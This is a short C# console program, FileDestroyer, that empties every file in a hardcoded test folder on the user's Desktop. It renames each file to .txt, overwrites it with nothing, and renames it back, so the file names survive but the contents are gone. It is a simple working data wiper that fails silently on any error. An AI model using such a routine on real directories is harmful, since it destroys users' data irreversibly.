using System;
using System.Collections.Generic;
using System.IO;

namespace FileDestroyer
{
    class Program
    {
        static void Main(string[] args)
        {
            DestroyFiles();
        }

        static void DestroyFiles()
        {
            DirectoryInfo location = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\Desktop\test thing");

            try
            {
                foreach (var file in location.GetFiles())
                {
                    try { File.Move(file.FullName.ToString(), Path.ChangeExtension(file.FullName.ToString(), ".txt")); }
                    catch { return; }
                    try { File.WriteAllText(Path.ChangeExtension(file.FullName.ToString(), ".txt"), ""); }
                    catch { return; }
                    try { File.Move(Path.ChangeExtension(file.FullName.ToString(), ".txt"), Path.ChangeExtension(file.FullName.ToString(), file.Extension)); }
                    catch { return; }
                }

            }
            catch { return; }
        }
    }
}
